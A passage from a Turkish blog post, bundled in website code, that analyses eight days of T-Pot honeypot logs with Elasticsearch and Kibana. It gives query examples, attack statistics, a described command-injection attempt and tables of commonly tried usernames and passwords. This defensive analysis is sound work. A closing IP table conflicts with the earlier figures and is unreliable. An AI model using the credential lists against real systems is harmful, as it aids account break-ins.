"use strict";(self.webpackChunkb_log=self.webpackChunkb_log||[]).push([[511],{8764:e=>{e.exports=JSON.parse('{"archive":{"blogPosts":[{"id":"tpot-honeypot-analizi-elasticsearch-kibana","metadata":{"permalink":"/b-log/blog/tpot-honeypot-analizi-elasticsearch-kibana","editUrl":"https://github.com/facebook/docusaurus/tree/main/packages/create-docusaurus/templates/shared/blog/2025-08-16/2025-08-16-tpot-honeypot-analizi-elasticsearch-kibana.md","source":"@site/blog/2025-08-16/2025-08-16-tpot-honeypot-analizi-elasticsearch-kibana.md","title":"Honeypot Projesi - Kapsaml\u0131 T-Pot Honeypot Veri Analizi ve Elasticsearch & Kibana Rehberi - B\xf6l\xfcm 2","description":"Giri\u015f","date":"2025-08-16T00:00:00.000Z","tags":[{"inline":false,"label":"Siber G\xfcvenlik","permalink":"/b-log/blog/tags/siberguvenlik","description":"G\xfcvenlik a\xe7\u0131klar\u0131, s\u0131zma testleri ve savunma teknikleri"},{"inline":false,"label":"Sistem Y\xf6netimi","permalink":"/b-log/blog/tags/sistemyonetimi","description":"Sistem y\xf6neticili\u011fi, sunucu yap\u0131land\u0131rma ve y\xf6netimi konular\u0131"}],"readingTime":22.26,"hasTruncateMarker":true,"authors":[{"name":"Berk Ali Er\xe7elik","title":"Cyber Security & Full Stack Web Dev","url":"https://github.com/berkercelik","page":{"permalink":"/b-log/blog/authors/berkercelik"},"socials":{"github":"https://github.com/berkercelik","linkedin":"https://www.linkedin.com/in/berkaliercelik/"},"imageURL":"https://avatars.githubusercontent.com/u/72663666?v=4","key":"berkercelik"}],"frontMatter":{"slug":"tpot-honeypot-analizi-elasticsearch-kibana","title":"Honeypot Projesi - Kapsaml\u0131 T-Pot Honeypot Veri Analizi ve Elasticsearch & Kibana Rehberi - B\xf6l\xfcm 2","authors":["berkercelik"],"tags":["siberguvenlik","sysadmin"]},"unlisted":false,"nextItem":{"title":"Honeypot Projesi - T-pot Honeypot Kurulumu - \u0130lk \u0130zlenimler - B\xf6l\xfcm 1","permalink":"/b-log/blog/honeypot-tpot-kurulumu"}},"content":"## Giri\u015f\\r\\n\\r\\nBir \xf6nceki b\xf6l\xfcmde T-Pot Honeypot kurulumundan ve ilk g\xf6zlemlerimizden s\xf6z etmi\u015ftim. Bu b\xf6l\xfcmde ise yakla\u015f\u0131k 8 g\xfcn boyunca a\xe7\u0131k kalan T-Pot Honeypot\u2019un \xfcretti\u011fi verileri ayr\u0131nt\u0131l\u0131 \u015fekilde ele alaca\u011f\u0131z. \xd6ncelikle kullan\u0131lan teknolojilere de\u011finecek, ard\u0131ndan Elasticsearch ve Kibana ile veri inceleme s\xfcrecine dair bir rehber sunaca\u011f\u0131m. Sonras\u0131nda genel analiz sonu\xe7lar\u0131n\u0131 payla\u015farak, her bir senaryo makinesini ayr\u0131 ba\u015fl\u0131klar alt\u0131nda detayl\u0131 bi\xe7imde de\u011ferlendirece\u011fiz. B\xf6l\xfcm\xfcn sonunda ise Suricata \u0130mzalar\u0131 ve CVE\'ler \xfczerinden ek bir inceleme yaparak, projeyi kapsaml\u0131 bir de\u011ferlendirme ile tamamlayaca\u011f\u0131z.\\r\\n\\r\\n\x3c!-- truncate --\x3e\\r\\n\\r\\n## \xd6nceki B\xf6l\xfcmden \\r\\n\\r\\n### Honeypot nedir?\\r\\nSiber g\xfcvenlikte sald\u0131rganlar\u0131n davran\u0131\u015flar\u0131n\u0131, y\xf6ntemlerini ve ara\xe7lar\u0131n\u0131 analiz etmek i\xe7in tasarlanm\u0131\u015f m\u0131\u015f gibi davranan \u201ctuzak sistemler\u201ddir.\\r\\n\\r\\nAma\xe7: Ger\xe7ek sistemleri korumak de\u011fil, sald\u0131rganlar\u0131 izlemek, veri toplamak ve analiz etmektir. Bu sayede ayn\u0131 sald\u0131r\u0131 ger\xe7ek siteme uygulanmak isterse \xf6nceden \xf6nlem alabiliriz.\\r\\n\\r\\n### T-Pot Honeypot nedir?\\r\\nTelekom Security taraf\u0131ndan geli\u015ftirilen, Docker tabanl\u0131 ve a\xe7\u0131k kaynakl\u0131 bir projedir. Birden fazla senaryo ve portlar i\xe7in farkl\u0131 makineleri ayn\u0131 anda \xe7al\u0131\u015ft\u0131r\u0131r. \u0130\xe7erisinde SSH, RDP, web uygulamalar\u0131, end\xfcstriyel kontrol sistemleri gibi bir\xe7ok hedef sim\xfclasyonu bulunur.\\r\\n\\r\\n| [T-Pot Github Repo](https://github.com/telekom-security/tpotce)\\r\\n\\r\\n![ ](media/image1.png)\\r\\n\\r\\n## 1. Techstack ve Veri Ak\u0131\u015f\u0131, Teknik Altyap\u0131\\r\\nToplanan verilerin i\u015flenmesi ve analizi i\xe7in bu projede Elasticsearch ve Kibana sayesinde yayg\u0131n ve g\xfc\xe7l\xfc bir teknoloji y\u0131\u011f\u0131n\u0131 kullan\u0131lm\u0131\u015ft\u0131r.\\r\\n\\r\\n### Elasticsearch\\r\\nT-Pot taraf\u0131ndan toplanan t\xfcm log kay\u0131tlar\u0131 ve sald\u0131r\u0131 verileri, da\u011f\u0131t\u0131k bir arama ve analiz motoru olan Elasticsearch\'e g\xf6nderilir. Elasticsearch, bu verileri neredeyse ger\xe7ek zamanl\u0131 olarak indeksleyerek sorgulanabilir ve analiz edilebilir hale getirir. Bu, onu \\"b\xfcy\xfck veri i\xe7in y\xfcksek performansl\u0131 bir arama motoru\\" yapar. Elasticsearch API arac\u0131l\u0131\u011fyla \xe7al\u0131\u015ft\u0131\u011f\u0131 i\xe7in Kibana ile olu\u015fan tablolar ve yapt\u0131\u011f\u0131m\u0131z sorgular da POST / GET istekleri sayesinde \xe7al\u0131\u015f\u0131r. Aray\xfcz olmadan gerekli parametreleri girerek \\"curl\\" ile de istek at\u0131labilir, veriler \xe7ekilebilir.\\r\\n\\r\\n### Kibana\\r\\nElasticsearch \xfczerinde \xe7al\u0131\u015fan bir veri g\xf6rselle\u015ftirme platformudur. Ham verileri anlaml\u0131 grafiklere, tablolara, haritalara ve panolara d\xf6n\xfc\u015ft\xfcr\xfcr. Kibana, \\"verilerin hayat buldu\u011fu ve anla\u015f\u0131ld\u0131\u011f\u0131 g\xf6sterge paneli\\" olarak i\u015flev g\xf6rerek, karma\u015f\u0131k veri setlerindeki desenleri ve anomalileri kolayca tespit etmemizi sa\u011flar.\\r\\n\\r\\nAna b\xf6l\xfcmleri:\\r\\n* Discover \u2192 Ham veriyi inceleme\\r\\n* Visualize / Lens \u2192 Grafik olu\u015fturma\\r\\n* Dashboard \u2192 Birden fazla g\xf6rselle\u015ftirmeyi tek sayfada toplama\\r\\n* Alerts \u2192 Belirli ko\u015fullarda e-posta/webhook tetikleme\\r\\n* Dev Tools \u2192 Elasticsearch API\u2019si ile \xe7al\u0131\u015fmak\\r\\n\\r\\n### Di\u011fer K\u0131s\u0131mlar (Attack Map, CyberChef, Elasticuve, Spiderfoot)\\r\\n![](media/image-3.png)\\r\\n\\r\\n#### Attack Map (Sald\u0131r\u0131 Haritas\u0131)\\r\\n* Ama\xe7: Anl\u0131k sald\u0131r\u0131lar\u0131 d\xfcnya haritas\u0131 \xfczerinde g\xf6rselle\u015ftirir.\\r\\n* Rol: Durumsal fark\u0131ndal\u0131k sa\u011flar, sald\u0131r\u0131lar\u0131n co\u011frafi da\u011f\u0131l\u0131m\u0131n\u0131 g\xf6sterir.\\r\\n* Kullan\u0131m: SOC ekranlar\u0131nda g\xf6rsellik, anomali fark etme, sunumlarda etki.\\r\\n\\r\\n#### CyberChef\\r\\n\\r\\n* Ama\xe7: Veri i\u015fleme ve d\xf6n\xfc\u015ft\xfcrme i\xe7in \u201cSiber \u0130svi\xe7re \xc7ak\u0131s\u0131\u201d. Bu ismi ger\xe7ekten hakediyor, \xe7ak\u0131 gibi \xe7ok fazla i\u015flevi var. Lokalde de \xe7al\u0131\u015ft\u0131rabilirsiniz, web tabanl\u0131d\u0131r.\\r\\n* Rol: Honeypot verilerinde gizlenmi\u015f veya kodlanm\u0131\u015f sald\u0131rgan komutlar\u0131n\u0131 \xe7\xf6z\xfcmleme.\\r\\n* Kullan\u0131m: Kod \xe7\xf6zme (Base64, Hex, URL encode vb.), IOC \xe7\u0131karma (IP, domain, e-posta), Basit \u015fifre \xe7\xf6z\xfcmleri (XOR vb.)\\r\\n\\r\\n#### Elasticvue\\r\\n\\r\\n* Ama\xe7: Elasticsearch i\xe7in hafif, web tabanl\u0131 y\xf6netim arac\u0131.\\r\\n* Rol: Kibana analiz i\xe7in kullan\u0131l\u0131rken, Elasticvue ham veri ve indeks y\xf6netimi i\xe7in kullan\u0131l\u0131r.\\r\\n* Kullan\u0131m: Loglar\u0131 JSON format\u0131nda inceleme, indeks sa\u011fl\u0131\u011f\u0131n\u0131 kontrol etme, h\u0131zl\u0131 sorgular.\\r\\n\\r\\n#### Spiderfoot\\r\\n\\r\\n* Ama\xe7: OSINT otomasyon arac\u0131, hedef hakk\u0131nda a\xe7\u0131k kaynaklardan bilgi toplar.\\r\\n* Rol: Honeypot\u2019un yakalad\u0131\u011f\u0131 sald\u0131rgan IP\u2019leri zenginle\u015ftirerek profilleme ve altyap\u0131 ke\u015ffi sa\u011flar.\\r\\n* Kullan\u0131m: Veri zenginle\u015ftirme, Sald\u0131rgan profillemesi, Altyap\u0131 ke\u015ffi (ilgili IP\u2019ler, domainler, C2 sunucular\u0131)\\r\\n\\r\\n### Veri Ak\u0131\u015f\u0131 \u015eemas\u0131\\r\\nT-Pot Honeypot Servisleri (Cowrie, Dionaea vb.) -> Log Kay\u0131tlar\u0131 -> Elasticsearch (\u0130ndeksleme ve Depolama) -> Kibana (G\xf6rselle\u015ftirme ve Analiz)\\r\\n\\r\\n### KQL ve ES|QL: Sorgulama Dilleri Fark\u0131\\r\\n\\r\\nKibana\'da veri sorgularken temel olarak iki dil kullan\u0131l\u0131r.\\r\\n#### KQL\\r\\n* KQL (Kibana Query Language): Kibana\'n\u0131n \xfcst k\u0131sm\u0131ndaki arama \xe7ubu\u011funda kulland\u0131\u011f\u0131n\u0131z basit ve kullan\u0131c\u0131 dostu dildir. \\r\\n* Amac\u0131: Veriyi interaktif olarak filtrelemek ve ke\u015ffetmektir.\\r\\n* S\xf6zdizimi (Syntax): Basittir. alanAd\u0131: \\"de\u011fer\\" veya alanAd\u0131 > 100 \u015feklinde yaz\u0131l\u0131r. Otomatik tamamlama \xf6zelli\u011fi vard\u0131r.\\r\\n* Genellikle h\u0131zl\u0131 filtreleme ve keyword search i\xe7in idealdir.\\r\\n* Sadece Kibana UI \xfczerinde \xe7al\u0131\u015f\u0131r (Elasticsearch API\u2019ye direkt g\xf6nderilemez).\\r\\n\\r\\n#### KQL Sorgu \xd6rnekleri\\r\\n\\r\\n* `eventid.keyword : cowrie* and src_ip: 198.51.*`\\r\\n* `type.keyword : \\"Cowrie\\" and username.keyword : root and password.keyword : root and eventid.keyword : cowrie*`\\r\\n* `@timestamp >= now-24h AND NOT destination.ip: \\"192.168.*\\"`\\r\\n* `src_ip : \\"192.168.1.100\\" AND event_type.keyword : \\"ssh\\"`\\r\\n\\r\\n#### ES|QL\\r\\n* ES|QL (Elasticsearch Query Language): Elasticsearch\'\xfcn yeni ve \xe7ok daha g\xfc\xe7l\xfc, SQL\'e benzeyen sorgulama dilidir.\\r\\n* Do\u011frudan Elasticsearch API\u2019sinde \xe7al\u0131\u015f\u0131r (Kibana ba\u011f\u0131ml\u0131 de\u011fildir).\\r\\n* Amac\u0131: Sadece filtreleme de\u011fil, ayn\u0131 zamanda veri \xfczerinde d\xf6n\xfc\u015f\xfcm, zenginle\u015ftirme ve karma\u015f\u0131k hesaplamalar yapmakt\u0131r. Veriyi g\xf6rselle\u015ftirmeden \xf6nce yeniden \u015fekillendirmenizi sa\u011flar.\\r\\n* S\xf6zdizimi: SQL\'e \xe7ok benzer. `FROM index | WHERE ko\u015fullar | STATS ... BY grup` gibi komutlar i\xe7erir.\\r\\n* \xd6rnek: \\r\\n```\\r\\nFROM \\"logstash-*\\"\\r\\n| WHERE event.module == \\"cowrie\\"\\r\\n| STATS\\r\\n    success_count = COUNT_IF(event.outcome == \'success\'),\\r\\n    failed_count = COUNT_IF(event.outcome == \'failure\')\\r\\n    BY source.ip\\r\\n| SORT success_count DESC\\r\\n``` \\r\\n\\r\\n(Cowrie i\xe7in her bir IP\'nin ba\u015far\u0131l\u0131 ve ba\u015far\u0131s\u0131z giri\u015f denemelerini sayar).\\r\\n\\r\\nK\u0131saca, h\u0131zl\u0131 filtreleme ve ke\u015fif i\xe7in KQL, raporlama ve derin analiz i\xe7in veri setini yeniden yap\u0131land\u0131rman\u0131z gerekti\u011finde ise ES|QL kullan\u0131l\u0131r.\\r\\n\\r\\n\\r\\n\\r\\n\\r\\n\\r\\n## 2. Elasticsearch ve Kibana Kullan\u0131m\u0131\\r\\n\\r\\n\xd6ncelikle bu projede \xe7ok fazla veri birikiyor. T\xfcm veriler bir yana makineleri ayr\u0131 ayr\u0131 analiz etmek \xe7ok zaman alan bir s\xfcre\xe7. \xc7ok fazla veri oldu\u011fu i\xe7in bir miktar yava\u015f \xe7al\u0131\u015fma bazen g\xf6zlenebilir. \u0130lk ba\u015fta gelen Dashboard\'\u0131 komple de\u011fi\u015ftirebilirsiniz. Yeni g\xf6rsel paneller ekleyebilirsiniz. \u0130stedi\u011finiz sorgulara ba\u011fl\u0131 bu paneller g\xf6rselle\u015ftirme yaparak kolay anla\u015f\u0131labilirlik sa\u011flar. \\r\\n\\r\\n#### Filtre Uygulama\\r\\n\\r\\nTarih aral\u0131\u011f\u0131 se\xe7imi yapabiliriz, Dashboard d\xfczenini de\u011fi\u015ftirebiliriz, herhangi bir grafi\u011fin sa\u011f \xfcstte beliren men\xfcs\xfcnden \\"Inspect\\" k\u0131sm\u0131ndan istedi\u011fimiz veriyi \\"+\\" butonu ile filtreleyebiliriz. Bu sayede sadece filtreyi kapsayan ve filreyle ilgili veriler g\xf6r\xfcn\xfcr hale gelir.\\r\\n\\r\\n![](media/image-16.png)\\r\\n\\r\\n![](media/image-17.png)\\r\\n\\r\\nBu filtreler \xe7ok daha spesifik olabilir. \xd6rne\u011fin parola denemesinde \\"123456\\" kullan\u0131lan loglar ekrana gelir.\\r\\n![](media/image-18.png)\\r\\n\\r\\n#### Men\xfcler\\r\\n\\r\\nElasticsearch i\xe7erisinde \xe7ok detayl\u0131 men\xfc ve ba\u015fl\u0131klar var. Burada bizi en \xe7ok ilgilendiren temel ba\u015fl\u0131klar Analytics alt\u0131nda Dashboards ve Discover, Security sekmesi alt\u0131nda Dashboards, Management alt\u0131nda Stack Management olarak tan\u0131mlanabilir. Di\u011fer k\u0131s\u0131mlardan da Elasticsearch\'\xfcn sa\u011flad\u0131\u011f\u0131 i\u015flevleri uygulayabilirsiniz.\\r\\n\\r\\n![](media/image-19.png)\\r\\n\\r\\n**Management > Data > Index Management** k\u0131sm\u0131nda tutulan log kay\u0131tlar\u0131n\u0131n genel durumunu g\xf6r\xfcnt\xfcleyebiliriz. Bir `logstash-*` dosyas\u0131n\u0131n \xfcst\xfcne t\u0131klayarak detaylara inebiliriz. Mappings k\u0131sm\u0131ndan tutulan loglardaki her veri i\xe7in ayr\u0131ca tutulmu\u015f etiketleri liste veya JSON format\u0131nda g\xf6r\xfcnt\xfcleyebiliriz. \\r\\n\\r\\n![](media/image-20.png)\\r\\n\\r\\nManagement > Kibana > Saved Objects k\u0131sm\u0131ndan daha \xf6nceden olu\u015fturulmu\u015f Kibana\'ya ait grafikleri objeler olarak g\xf6r\xfcnt\xfcleyebiliriz. D\u0131\u015fa aktar\u0131m\u0131 sa\u011f \xfcstten Export k\u0131sm\u0131ndan yapabiliriz. \\"export.ndjson\\" olarak d\u0131\u015fa aktar\u0131l\u0131r.\\r\\n\\r\\n![](media/image-21.png)\\r\\n\\r\\n#### Kay\u0131tlar\u0131 (Log) D\u0131\u015fa Aktarma\\r\\n\\r\\n\xd6rnek olarak Analytics > Discover sayfas\u0131na gelelim. Hi\xe7 bir filtre uygulamad\u0131\u011f\u0131m\u0131z zaman 6,6 milyon log oldu\u011fu sorgulan\u0131yor. \\r\\n\\r\\n![](media/image-22.png)\\r\\n\\r\\n\xd6rnek olarak `eventid.keyword : cowrie* AND username.keyword : root AND password.keyword : *` sorgusunu girersek Cowrie makinesine root:* (herhangi bir kelime) username:password denemesi ile yap\u0131lan giri\u015f denemelerini g\xf6rm\xfc\u015f oluruz.\\r\\n\\r\\n![](media/image-24.png)\\r\\n![](media/image-25.png)\\r\\n\\r\\nBunu d\u0131\u015fa aktarmak i\xe7in sa\u011f \xfcstteki Share > Export butonuna bast\u0131ktan sonra \\"Generate CSV\\" se\xe7iyoruz ve uyguluyoruz. D\u0131\u015fa aktar\u0131lan dosyalar **Management > Alerts and Insights > Reporting** sekmesinde haz\u0131rlan\u0131yor ve haz\u0131r olunca indiriliyor. E\u011fer b\xfcy\xfck say\u0131da olan bir sorguyu d\u0131\u015fa aktarmak istiyorsan\u0131z muhtemelen hepsini aktaramayacakt\u0131r. Veri b\xfcy\xfckl\xfc\u011f\xfcne ba\u011fl\u0131 olarak belli bir noktadan sonra eksik olarak dosyay\u0131 olu\u015fturacakt\u0131r.\\r\\n\\r\\n`https://sunucuIP:64297/kibana/app/management/insightsAndAlerting/reporting` adresinde olu\u015fturulan raporlar listelenir.\\r\\n\\r\\n![](media/image-23.png)\\r\\n\\r\\nDaha detayl\u0131 analizler i\xe7in e\u011fer eri\u015fim varsa direkt Elasticsearch API ile veriler de \xe7ekilebilir. Her istekte s\u0131n\u0131r 10 bindir. Baz\u0131 ara\xe7larla par\xe7a par\xe7a b\xfcy\xfck bir log indirilebilir.\\r\\n\\r\\n#### \xd6rnek Log \u0130ncelemesi\\r\\n\\r\\n![](media/image-26.png)\\r\\n\\r\\nAyn\u0131 \u015fekilde Discover sayfas\u0131ndan istedi\u011fimiz filtreyi uygulayarak; \xf6rnek `type.keyword : \\"Suricata\\"  AND dest_port: 80 and payload_printable.keyword : GET *` sorgusuyla bir sald\u0131rgan\u0131n **Command Injection** denemesi ile kendi sunucusundan Honetpot\'un `/tmp` klas\xf6r\xfcne dosya indirmeye \xe7al\u0131\u015f\u0131yor. Bu sald\u0131r\u0131y\u0131 \xfczerine t\u0131klayarak filtreledi\u011fimizde ayn\u0131 anda d\xf6rt farkl\u0131 kural\u0131 birden ihlal etti\u011fini farkediyoruz. \\r\\n\\r\\n![](media/image-27.png)\\r\\n\\r\\n1. \u0130lk Log: Bu sald\u0131r\u0131, bilinen bir zafiyet olan CVE-2016-20016 ile e\u015fle\u015fen bir \\"Web Uygulama Sald\u0131r\u0131s\u0131d\u0131r\\".\\r\\n\\r\\n2. \u0130kinci Log: Bu sald\u0131r\u0131, genel bir \\"Web Uygulama Sald\u0131r\u0131s\u0131\\" kural\u0131n\u0131 daha tetiklemi\u015ftir (Belki de wget ve sh komutlar\u0131n\u0131n ayn\u0131 anda kullan\u0131lmas\u0131ndan dolay\u0131).\\r\\n\\r\\n3. \xdc\xe7\xfcnc\xfc Log: Bu sald\u0131r\u0131n\u0131n amac\u0131 \\"Y\xf6netici Ayr\u0131cal\u0131klar\u0131 Kazanma Giri\u015fimi\\" olarak de\u011ferlendirilmi\u015ftir ve IoT  cihazlar\u0131n\u0131 hedeflemektedir.\\r\\n\\r\\n4. D\xf6rd\xfcnc\xfc Log: Bir \xf6nceki maddeyi destekler \u015fekilde, yine \\"Y\xf6netici Ayr\u0131cal\u0131klar\u0131 Kazanma Giri\u015fimi\\" ve IoT hedefli oldu\u011funa dair ba\u015fka bir kural daha bu paketi tehlikeli olarak i\u015faretlemi\u015ftir.\\r\\n\\r\\n#### API ve Konsol Kullan\u0131m\u0131\\r\\n\\r\\nDiscover > Inspect> View:Request sekmesinden > Open in Console veya herhangi bir grafi\u011fin Inspect butonundan sonra View:Requests olarak se\xe7iyoruz. Burada Request (\u0130stek) ve Response (D\xf6n\xfct) sekmelerini g\xf6r\xfcnt\xfcleyebiliriz.\\r\\n\\r\\n`https://sunucuIP:64297/kibana/app/dev_tools#/console/shell`\\r\\n\\r\\n![](media/image-32.png)\\r\\n\\r\\nKonsol a\xe7t\u0131\u011f\u0131m\u0131zda istedi\u011fimiz filtreyi manuel olarak ekleyerek sorguyu \xe7al\u0131\u015ft\u0131rabiliriz.\\r\\n\\r\\n```\\r\\n\\"filter\\": [\\r\\n  {\\r\\n    \\"term\\": { \\"dest_port\\": 22 }\\r\\n  },\\r\\n  {\\r\\n    \\"wildcard\\": { \\"eventid.keyword\\": \\"cowrie*\\" }\\r\\n  },\\r\\n  {\\r\\n    \\"range\\": {\\r\\n      \\"@timestamp\\": {\\r\\n        \\"gte\\": \\"2025-08-04T21:00:00.000Z\\",\\r\\n        \\"lte\\": \\"2025-08-15T16:17:14.240Z\\"\\r\\n      }\\r\\n    }\\r\\n  }\\r\\n]\\r\\n```\\r\\n\\r\\n![](media/image-28.png)\\r\\n![](media/image-29.png)\\r\\n\\r\\n\\r\\n\\r\\n\\r\\n## 3. Genel Sald\u0131r\u0131 \u0130statistikleri (Makro Analiz)\\r\\n\\r\\n\u0130lk ba\u015fta total verilerle ba\u015flayal\u0131m.\\r\\n\\r\\n### 1. Toplam Sald\u0131r\u0131 Say\u0131s\u0131\\r\\n\\r\\n* Toplam: 5 A\u011fustos\'tan itibaren 8 g\xfcn boyunca toplam **380,127 sald\u0131r\u0131** denemesi yap\u0131ld\u0131.\\r\\n* Yo\u011funluk: **82,784 sald\u0131r\u0131** ile 8 A\u011fustos\'ta zirve, en yo\u011fun tekil sald\u0131r\u0131 ya\u015fand\u0131.\\r\\n* Trend: G\xfcnl\xfck ortalama **35,942 sald\u0131r\u0131** yap\u0131ld\u0131.\\r\\n\\r\\n![](media/image.png)\\r\\n![](media/image-1.png)\\r\\n\\r\\n\\r\\n### 2. Co\u011frafi Da\u011f\u0131l\u0131m (GeoIP)\\r\\n**En \xe7ok sald\u0131r\u0131 ger\xe7ekle\u015ftiren \xfclkeler:**\\r\\n\\r\\n* Romanya \u2013 %50\\r\\n* ABD \u2013 %21\\r\\n* \xc7in \u2013 %7\\r\\n* Vietnam \u2013 %4\\r\\n* Brezilya \u2013 %4\\r\\n* Di\u011fer \u2013 %14\\r\\n\\r\\n### 3. Hedef Al\u0131nan Servisler ve Portlar\\r\\n\\r\\n| Honeypot      | Atak Say\u0131s\u0131 |\\r\\n| ------------- | ------------ |\\r\\n| Sentrypeer    | 172,687     |\\r\\n| Cowrie        | 139,030      |\\r\\n| Dionaea       | 49,066       |\\r\\n| Tanner        | 5,590        |\\r\\n| Redishoneypot | 3,718        |\\r\\n| Ciscoasa      | 1,866        |\\r\\n| ConPot        | 1,663        |\\r\\n| H0neytr4p     | 1,617        |\\r\\n| Adbhoney      | 1,606        |\\r\\n| Mailoney      | 1,348        |\\r\\n\\r\\n\\r\\n| Honeypot Ad\u0131      | Servisler / Protokoller                        | Portlar                                                                                     | Trafik Oran\u0131 |\\r\\n| ----------------- | ---------------------------------------------- | ---------------------------------------------------------------------------------------------- | ------------ |\\r\\n| **Sentrypeer**    | SIP                                            | 5060                                                                                             | %46          |\\r\\n| **Cowrie**        | SSH, Telnet Honeypot                           | 22 (SSH), 23 (Telnet)                                                                          | %37          |\\r\\n| **Dionaea**       | HTTP, HTTPS, FTP, TFTP, **SMB**, MSSQL, MySQL, SIP | 80 (HTTP), 443 (HTTPS), 21 (FTP), 69 (TFTP), **445 (SMB)**, 1433 (MSSQL), 3306 (MySQL), 5060 (SIP) | %13          |\\r\\n| **Tanner**        | Web / Exploit Tabanl\u0131 Honeypot                 | Genellikle **80**, 443                                                                 | %1           |\\r\\n| **Redishoneypot** | Redis DB Honeypot                              | 6379                                                                                           | %1           |\\r\\n| **Di\u011fer**         | \xc7e\u015fitli servisler                              | Farkl\u0131 portlar                                                                                 | %2           |\\r\\n\\r\\n**Asl\u0131nda bu noktada belli bir g\xfcne kadar Cowrie hep \xf6ndeydi ve Cowrie grafiklerde de g\xf6r\xfcld\xfc\u011f\xfc \xfczere s\xfcre\xe7 boyunca devaml\u0131 denenmeye devam etti. Tekil bir sald\u0131rgan \u0131srarla Sentrypeer makinesini 2 kez y\xfcksek boyutta hedef alarak istatisti\u011fi y\xfckseltti.**\\r\\n\\r\\n**Ayr\u0131ca sald\u0131r\u0131 yapan makinelerin %90\'\u0131 \\"Linux 2.2.x-3.x\\" %7\'si \\"Windows 7 veya 8\\" ve geri kalan\u0131 ise \xe7o\u011funlukla Linux makinelerden olu\u015fuyor.**\\r\\n\\r\\n### 4. En Yayg\u0131n Kullan\u0131c\u0131 Ad\u0131 / Parola Denemeleri\\r\\n\\r\\n| Username (Kullan\u0131c\u0131 Ad\u0131) | Deneme Say\u0131s\u0131  | Password (Parola) | Deneme Say\u0131s\u0131  |\\r\\n| -------- | ------------------------- | --------- | ---------------------- |\\r\\n| root     | 7,858                     | 123456    | 2,681                  |\\r\\n| sa       | 905                       | 123       | 552                    |\\r\\n| admin    | 882                       | password  | 438                    |\\r\\n| oracle   | 490                       | admin     | 327                    |\\r\\n| user     | 444                       | (empty)   | 289                    |\\r\\n| postgres | 385                       | abc123    | 289                    |\\r\\n| test     | 309                       | 1         | 255                    |\\r\\n| ubuntu   | 303                       | 12345678  | 210                    |\\r\\n| www      | 272                       | 1234      | 209                    |\\r\\n| ftpuser  | 260                       | 123456789 | 178                    |\\r\\n| pi       | 249                       | 111111    | 176                    |\\r\\n| hadoop   | 247                       | 12345     | 166                    |\\r\\n| es       | 227                       | root      | 155                    |\\r\\n| mysql    | 226                       | admin123  | 137                    |\\r\\n| steam    | 218                       | test      | 121                    |\\r\\n\\r\\n![](media/image-2.png)\\r\\n\\r\\n### 5. En \xc7ok Sald\u0131r\u0131 Yapan IP\u2019ler ve \u0130lgili ASN\'ler\\r\\n\\r\\n| Source IP  | Atak Say\u0131s\u0131   |\\r\\n| ---------- | ------- |\\r\\n| 2.57.\\\\*    | 159,935 |\\r\\n| 96.44.\\\\*   | 8,406   |\\r\\n| 196.251.\\\\* | 5,917   |\\r\\n| 134.199.\\\\* | 5,656   |\\r\\n| 131.0.\\\\*   | 5,191   |\\r\\n| 45.186.\\\\*  | 5,098   |\\r\\n| 20.192.\\\\*  | 3,744   |\\r\\n| 129.212.\\\\* | 3,546   |\\r\\n| 173.231.\\\\* | 3,483   |\\r\\n| 114.55.\\\\*  | 3,392   |\\r\\n| 179.148.\\\\* | 3,158   |\\r\\n| 2.177.\\\\*   | 3,156   |\\r\\n\\r\\n\\r\\n**ASN**, Autonomous System Number (Otonom Sistem Numaras\u0131) demektir. Bunu \u015f\xf6yle d\xfc\u015f\xfcnebiliriz. \u0130nternetteki her b\xfcy\xfck a\u011f (\xf6rne\u011fin bir internet servis sa\u011flay\u0131c\u0131s\u0131, bir veri merkezi \u015firketi veya b\xfcy\xfck bir kurumun a\u011f\u0131) bir otonom sistemtir. ASN, BGP (Border Gateway Protocol) \xfczerinden internette y\xf6nlendirme yapan a\u011flar\u0131n kimlik numaras\u0131d\u0131r. \\r\\n\\r\\n\u0130nternetteki IP bloklar\u0131 (IPv4 veya IPv6) bu ASN\u2019lere tahsis edilir. Her ASN, bir organizasyona veya servis sa\u011flay\u0131c\u0131ya aittir. En \xe7ok sald\u0131r\u0131 gelen ilk ASN\'yi [mxtoolbox](https://mxtoolbox.com/SuperTool.aspx?action=asn%3a47890) \xfczerinden ara\u015ft\u0131rd\u0131\u011f\u0131m\u0131zda `Total amount of IPs for this ASN: 9,728` yaz\u0131s\u0131n\u0131 g\xf6r\xfcyoruz. \\r\\n\\r\\nVe bu ASN\'yi kenar\u0131ndaki \\"+\\" butonu ile filtreye ekledi\u011fimizde buradan gelen di\u011fer t\xfcm IP\'ler ve di\u011fer grafikler de filtreleniyor. Bu ASN i\xe7in \xf6zel bir filtre, kural yazabiliriz. IP engelleme veya rate limit gibi \xf6nlemler d\xfc\u015f\xfcn\xfclebilir.\\r\\n\\r\\n\xd6rnek olarak en y\xfcksek de\u011ferli ASN\'yi filtreledi\u011fimde Sentrypeer ve Cowrie makinelerine denemeler yapt\u0131\u011f\u0131n\u0131 g\xf6r\xfcyoruz.\\r\\n![](media/image-4.png)\\r\\n![](media/image-10.png)\\r\\n![](media/image-11.png)\\r\\n\xd6zellikle Solana ile alakal\u0131 user:pass kombolar\u0131 denendi\u011fi analiz ediliyor.\\r\\n\\r\\n\u0130kinci en y\xfcksek de\u011ferli ASN\'yi filtreledi\u011fimde Cowrie makinesine birden fazla IP ile sald\u0131r\u0131 yap\u0131ld\u0131\u011f\u0131n\u0131 farkettim.\\r\\n![](media/image-5.png)\\r\\n\\r\\n![](media/image-6.png)\\r\\n\\r\\nFarkl\u0131 bir ASN filtreledi\u011fimde birden fazla portun (Honeypot makinelerinin) denendi\u011fini analiz ediyoruz. Birden fazla \xfclke ve birden fazla port farkl\u0131 zamanlarda sald\u0131r\u0131ya u\u011fram\u0131\u015f.\\r\\n![](media/image-7.png)\\r\\n![](media/image-8.png)\\r\\n![](media/image-9.png)\\r\\n\\r\\nIP Adresi\\t\xdclke\\tSald\u0131r\u0131 Say\u0131s\u0131\\tIP Reputation\\r\\n45.67.89.101\\t\xc7in\\t4.532\\tK\xf6t\xfc\\r\\n91.203.45.78\\tRusya\\t3.980\\tK\xf6t\xfc\\r\\n103.45.76.210\\tVietnam\\t3.412\\tK\xf6t\xfc\\r\\n\\r\\n> En \xe7ok sald\u0131r\u0131 yapan 10 IP adresinin 5 tanesi Block List\'lerde yer al\u0131yor olarak g\xf6z\xfck\xfcyor. 6 tanesi ise IP Reputation olarak \\"Poor\\" durumda g\xf6z\xfck\xfcyor. Ek olarak \\"Attacker Src IP Reputation\\" grafi\u011finde %99 oran\u0131nda \\"known 